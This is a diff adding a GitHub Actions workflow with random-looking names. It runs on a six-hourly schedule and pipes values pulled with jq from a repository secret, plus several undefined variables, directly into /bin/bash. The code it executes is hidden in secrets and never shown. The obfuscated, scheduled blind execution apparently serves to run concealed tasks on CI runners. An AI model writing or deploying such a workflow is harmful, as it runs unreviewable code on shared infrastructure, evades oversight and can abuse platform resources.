@@ -1,0 +1,25 @@
+name: wengkeneng3197
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengkeneng3197
+        env:
+          kdg51851: ${{ secrets.kdg51851 }}
+        run: |
+          echo $kdg51851 | jq -r .qor0860 | /bin/bash
+          echo $x7786 | jq -r .leclx6 | /bin/bash
+          echo $zk111 | jq -r .leyql42376 | /bin/bash
+          echo $bcp36 | jq -r .x0 | /bin/bash
+          echo $mn52279 | jq -r .namkr661 | /bin/bash
+          echo $mrj061 | jq -r .swhjn5242 | /bin/bash
+          echo $vs081 | jq -r .b81 | /bin/bash
+          echo $pr4268 | jq -r .jjm35 | /bin/bash
+          echo $njkub564 | jq -r .ctrf5329 | /bin/bash
+
